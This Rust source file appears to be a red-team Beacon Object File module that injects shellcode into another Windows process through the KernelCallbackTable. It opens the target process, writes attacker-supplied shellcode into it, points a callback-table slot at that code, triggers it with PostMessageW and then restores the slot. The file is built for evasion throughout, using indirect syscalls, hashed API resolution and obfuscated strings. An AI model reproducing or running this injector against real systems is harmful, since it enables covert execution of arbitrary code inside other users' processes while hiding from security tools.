// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
// Project: DEF-Situational-Awareness-BOF — Dani RustBOF OPSEC Suite
// Credit: Rust port + OPSEC hardening
//
//! KernelCallbackTable injection: overwrite a KCT slot in the target's PEB
//! to point at our shellcode, then trigger it via PostMessageW(WM_NULL).
//!
//! Args: <pid> <shellcode-hex>
//!
//! Flow (indirect syscalls + DFR):
//!   1. NtOpenProcess (QUERY_INFO | VM_OP | VM_WRITE | VM_READ)
//!   2. NtQueryInformationProcess(ProcessBasicInformation) → PEB address
//!   3. NtReadVirtualMemory → read PEB.KernelCallbackTable (offset 0x58 x64)
//!   4. NtReadVirtualMemory → read original KCT slot[0]
//!   5. NtAllocateVirtualMemory (RW) in target → write shellcode
//!   6. NtProtectVirtualMemory → RX
//!   7. NtWriteVirtualMemory → overwrite KCT slot[0] with shellcode addr
//!   8. DFR PostMessageW(target-window, WM_NULL) → triggers KCT dispatch
//!   9. NtWriteVirtualMemory → restore original KCT slot[0]
//!  10. NtClose
//!
//! OPSEC: KCT slot is restored immediately after trigger. Shellcode must
//! be position-independent and short-lived — long-running payloads should
//! trampoline out.

#![no_std]
#![cfg_attr(not(test), no_main)]

use rustbof::{println, eprintln};
use alloc::string::String;
use alloc::vec::Vec;
use common::{mitre::Technique, dfr_fn, obf};

const TECHNIQUES: &[Technique] = &[
    Technique { id: "T1055", name: "Process Injection (KernelCallbackTable)", tactic: "Defense Evasion" },
];

const PROCESS_ALL: u32 = 0x0008 | 0x0010 | 0x0020 | 0x0400;
const PAGE_READWRITE: u32 = 0x04;
const PAGE_EXECUTE_READ: u32 = 0x20;
const MEM_COMMIT: u32 = 0x1000;
const MEM_RESERVE: u32 = 0x2000;
const STATUS_SUCCESS: i32 = 0;
const WM_NULL: u32 = 0;

#[repr(C)]
struct ObjectAttributes { length: u32, _rest: [usize; 5] }
#[repr(C)]
struct ClientId { unique_process: usize, unique_thread: usize }

dfr_fn!(
    post_message_w(hwnd: usize, msg: u32, wparam: usize, lparam: usize) -> i32,
    module = "user32.dll", api = "PostMessageW"
);
dfr_fn!(
    find_window_ex_a(parent: usize, child: usize, class: *const i8, title: *const i8) -> usize,
    module = "user32.dll", api = "FindWindowExA"
);
dfr_fn!(
    get_window_thread_process_id(hwnd: usize, pid: *mut u32) -> u32,
    module = "user32.dll", api = "GetWindowThreadProcessId"
);

fn parse_u32(s: &str) -> Option<u32> {
    let mut v: u32 = 0; let mut any = false;
    for b in s.bytes() {
        if !b.is_ascii_digit() { return None; }
        v = v.checked_mul(10)?.checked_add((b - b'0') as u32)?;
        any = true;
    }
    if any { Some(v) } else { None }
}
fn parse_hex(s: &str) -> Option<Vec<u8>> {
    let mut out = Vec::with_capacity(s.len() / 2);
    let mut hi: Option<u8> = None;
    for c in s.bytes() {
        let v = match c {
            b'0'..=b'9' => c - b'0', b'a'..=b'f' => c - b'a' + 10,
            b'A'..=b'F' => c - b'A' + 10, b' '|b'\t'|b'\r'|b'\n'|b',' => continue,
            _ => return None,
        };
        match hi { None => hi = Some(v), Some(h) => { out.push((h << 4) | v); hi = None; } }
    }
    if hi.is_some() || out.is_empty() { return None; }
    Some(out)
}
fn close_h(h: usize) {
    use common::syscalls::{SyscallEntry, resolve, do_syscall4};
    static E: SyscallEntry = SyscallEntry::new();
    if let Ok((s, a)) = unsafe { resolve(&E, common::hash::djb2(b"NtClose")) } {
        let _ = unsafe { do_syscall4(h, 0, 0, 0, s, a) };
    }
}

#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    common::mitre::print_banner(env!("CARGO_PKG_NAME"), TECHNIQUES);
    let mut parser = rustbof::data::DataParser::new(args, len);
    match run(&mut parser) {
        Ok(()) => {},
        Err(e) => eprintln!("[!] {}: {}", env!("CARGO_PKG_NAME"), e),
    }
}

fn run(parser: &mut rustbof::data::DataParser) -> Result<(), &'static str> {
    let pid_s = String::from(parser.get_str());
    let hex_s = String::from(parser.get_str());
    let pid_s = pid_s.as_str();
    let hex_s = hex_s.as_str();
    if pid_s.is_empty() || hex_s.is_empty() {
        return Err("usage: inject-ktable <pid> <shellcode-hex>");
    }
    let pid: u32 = parse_u32(pid_s).ok_or("invalid pid")?;
    let mut sc = parse_hex(hex_s).ok_or("invalid hex")?;

    use common::syscalls::{SyscallEntry, resolve, do_syscall4, do_syscall5, do_syscall6};

    // 1. NtOpenProcess
    static OP: SyscallEntry = SyscallEntry::new();
    let (op_s, op_a) = unsafe { resolve(&OP, common::hash::djb2(b"NtOpenProcess")) }
        .map_err(|_| "resolve")?;
    let oa = ObjectAttributes { length: 48, _rest: [0; 5] };
    let cid = ClientId { unique_process: pid as usize, unique_thread: 0 };
    let mut h_proc: usize = 0;
    let st = unsafe { do_syscall4(&mut h_proc as *mut _ as usize, PROCESS_ALL as usize, &oa as *const _ as usize, &cid as *const _ as usize, op_s, op_a) };
    if st != STATUS_SUCCESS || h_proc == 0 { common::evasion::secure_zero(&mut sc); return Err("proc open failed"); }

    // 2. NtQueryInformationProcess → PEB addr
    static QI: SyscallEntry = SyscallEntry::new();
    let (qi_s, qi_a) = unsafe { resolve(&QI, common::hash::djb2(b"NtQueryInformationProcess")) }
        .map_err(|_| "resolve")?;
    let mut pbi = [0u8; 48];
    let mut ret: u32 = 0;
    let st2 = unsafe { do_syscall5(h_proc, 0, pbi.as_mut_ptr() as usize, 48, &mut ret as *mut _ as usize, qi_s, qi_a) };
    if st2 != STATUS_SUCCESS { close_h(h_proc); common::evasion::secure_zero(&mut sc); return Err("query failed"); }
    let peb_addr = unsafe { core::ptr::read_unaligned(pbi.as_ptr().add(8) as *const usize) };

    // 3. Read PEB.KernelCallbackTable (offset 0x58 on x64)
    static RD: SyscallEntry = SyscallEntry::new();
    let (rd_s, rd_a) = unsafe { resolve(&RD, common::hash::djb2(b"NtReadVirtualMemory")) }
        .map_err(|_| "resolve")?;
    let mut kct_addr: usize = 0;
    let mut rd_n: usize = 0;
    let st3 = unsafe { do_syscall5(h_proc, peb_addr + 0x58, &mut kct_addr as *mut _ as usize, 8, &mut rd_n as *mut _ as usize, rd_s, rd_a) };
    if st3 != STATUS_SUCCESS || kct_addr == 0 { close_h(h_proc); common::evasion::secure_zero(&mut sc); return Err("read KCT addr failed"); }

    // 4. Read original KCT[0]
    let mut orig_slot: usize = 0;
    let st4 = unsafe { do_syscall5(h_proc, kct_addr, &mut orig_slot as *mut _ as usize, 8, &mut rd_n as *mut _ as usize, rd_s, rd_a) };
    if st4 != STATUS_SUCCESS { close_h(h_proc); common::evasion::secure_zero(&mut sc); return Err("read KCT[0] failed"); }

    // 5. Alloc shellcode in target (RW)
    static AL: SyscallEntry = SyscallEntry::new();
    let (al_s, al_a) = unsafe { resolve(&AL, common::hash::djb2(b"NtAllocateVirtualMemory")) }
        .map_err(|_| "resolve")?;
    let mut sc_base: usize = 0;
    let mut sc_sz: usize = sc.len();
    let st5 = unsafe { do_syscall6(h_proc, &mut sc_base as *mut _ as usize, 0, &mut sc_sz as *mut _ as usize, (MEM_COMMIT|MEM_RESERVE) as usize, PAGE_READWRITE as usize, al_s, al_a) };
    if st5 != STATUS_SUCCESS { close_h(h_proc); common::evasion::secure_zero(&mut sc); return Err("alloc failed"); }

    // Write shellcode
    static WR: SyscallEntry = SyscallEntry::new();
    let (wr_s, wr_a) = unsafe { resolve(&WR, common::hash::djb2(b"NtWriteVirtualMemory")) }
        .map_err(|_| "resolve")?;
    let mut wr_n: usize = 0;
    let st6 = unsafe { do_syscall5(h_proc, sc_base, sc.as_ptr() as usize, sc.len(), &mut wr_n as *mut _ as usize, wr_s, wr_a) };
    common::evasion::secure_zero(&mut sc);
    if st6 != STATUS_SUCCESS { close_h(h_proc); return Err("write shellcode failed"); }

    // 6. Protect → RX
    static PR: SyscallEntry = SyscallEntry::new();
    let (pr_s, pr_a) = unsafe { resolve(&PR, common::hash::djb2(b"NtProtectVirtualMemory")) }
        .map_err(|_| "resolve")?;
    let mut b2 = sc_base; let mut s2 = wr_n; let mut op2: u32 = 0;
    let _ = unsafe { do_syscall5(h_proc, &mut b2 as *mut _ as usize, &mut s2 as *mut _ as usize, PAGE_EXECUTE_READ as usize, &mut op2 as *mut _ as usize, pr_s, pr_a) };

    // 7. Overwrite KCT[0] with shellcode address
    let st7 = unsafe { do_syscall5(h_proc, kct_addr, &sc_base as *const _ as usize, 8, &mut wr_n as *mut _ as usize, wr_s, wr_a) };
    if st7 != STATUS_SUCCESS { close_h(h_proc); return Err("overwrite KCT[0] failed"); }

    // 8. Trigger via PostMessageW(WM_NULL) to a window owned by the target
    let hwnd = find_target_window(pid);
    if hwnd != 0 {
        let _ = unsafe { post_message_w(hwnd, WM_NULL, 0, 0) };
    }

    // 9. Restore original KCT[0]
    let _ = unsafe { do_syscall5(h_proc, kct_addr, &orig_slot as *const _ as usize, 8, &mut wr_n as *mut _ as usize, wr_s, wr_a) };

    close_h(h_proc);
    obf! { let ok = "KCT injected + restored"; }
    println!("[+] {} (pid={})", ok, pid);
    Ok(())
}

/// Find any window owned by `pid`. Returns 0 if none found.
fn find_target_window(pid: u32) -> usize {
    let mut hwnd: usize = 0;
    // Iterate top-level windows via FindWindowExA(NULL, prev, NULL, NULL)
    for _ in 0..4096 {
        let next = unsafe { find_window_ex_a(0, hwnd, core::ptr::null(), core::ptr::null()) }
            .unwrap_or(0);
        if next == 0 { break; }
        let mut w_pid: u32 = 0;
        let _ = unsafe { get_window_thread_process_id(next, &mut w_pid) };
        if w_pid == pid { return next; }
        hwnd = next;
    }
    0
}
